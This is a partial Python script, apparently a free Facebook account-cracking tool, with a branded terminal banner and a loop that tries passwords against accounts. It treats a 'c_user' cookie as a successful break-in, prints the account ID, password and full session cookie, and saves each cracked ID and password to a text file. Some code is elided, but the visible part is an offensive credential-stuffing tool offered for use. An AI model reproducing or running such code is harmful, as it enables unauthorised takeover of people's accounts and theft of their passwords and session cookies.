...
[•]\033[1;33mFACEBOOK       : \033[1;33mAB KHANX\033[1;33m
[•]\033[1;34mYOUTUBE        : \033[1;32mMSS TRICKS\033[1;32m
[•]\033[1;35mSTATUS         : \033[1;33mFREE\033[1;33m
--------------------------------------------------
[•] \033[1;32m𝙆𝙄𝙉𝙂𝙓 𝙈𝙍 𝙎𝙒𝘼𝙏𝙄🎭🔥🦁\033[1;32m
--------------------------------------------------"""
...
cps = []
try:
    print('\n\033[1;37m[•] ALREADY UPDATED DONE')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SW4TI-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('SW4TI-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[💔-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mAB-KHANX\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
